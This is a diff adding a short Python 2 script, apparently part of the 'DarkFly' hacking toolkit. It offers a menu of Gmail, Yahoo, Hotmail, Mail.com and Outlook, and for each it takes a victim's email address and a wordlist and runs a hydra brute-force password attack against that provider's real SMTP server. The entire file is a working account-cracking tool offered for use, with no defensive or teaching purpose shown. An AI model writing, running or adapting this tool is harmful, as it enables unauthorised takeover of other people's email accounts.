@@ -1,0 +1,70 @@
+#!/usr/bin/python
+import os, time
+
+def gmail():
+	email = raw_input('[*] Email : ')
+	passw = raw_input('[*] wordlist path : ')
+	os.system('hydra -l %s -P %s -s 465 -S -v -V -t 1 smtp://smtp.gmail.com' % (email, passw,))
+
+def yahoo():
+	yahoo = raw_input('[*] yahoo : ')
+	passw = raw_input('[*] wordlist path : ')
+	os.system('hydra -l %s -P %s -s 465 -S -v -V -t 1 smtp://smtp.mail.yahoo.com' % (yahoo, passw,))
+
+def hotmail():
+	hotmail = raw_input('[*] mail : ')
+	passw = raw_input('[*] wordlist path : ')
+	os.system('hydra -l %s -P %s -s 587 -S -v -V -t 1 smtp://smtp.live.com' % (hotmail, passw,))
+
+def mail():
+	mail = raw_input('[*] mail : ')
+	passw = raw_input('[*] wordlist path : ')
+	os.system('hydra -l %s -P %s -s 587 -S -v -V -t 1 smtp://smtp.mail.com' % (mail, passw,))
+
+def outlook():
+	outlook = raw_input('[*] outlook : ')
+	passw = raw_input('[*] wordlist : ')
+	os.system('hydra -l %s -P %s -s 587 -S -v -V -t 1 smtp://smtp-mail.outlook.com' % (outlook, passw,))
+
+def back():
+	os.system('DarkFly')
+
+def baner():
+	os.system('clear')
+	print ('''\a\n
+                       
+       _ . _ .|__|\_/_| _ _  
+      ||||| )||  | |(_|| (_| 
+      
+      =====================
+      _____________________
+
+      [1] Gmail
+      [2] Yahoo
+      [3] hotmail
+      [4] Mail
+      [5] Outlook
+
+      [0] Back
+      ____________________
+      ====================
+		''')
+baner()
+k = raw_input('[*] :')
+
+if k == '1':
+	gmail()
+elif k == '2':
+	yahoo()
+elif k == '3':
+	hotmail()
+elif k == '4':
+	mail()
+elif k == '5':
+	outlook()
+elif k == '0':
+	back()
+else:
+	print '\a\n[x] Sorry wrong input...'
+	time.sleep(0.8)
+	back()
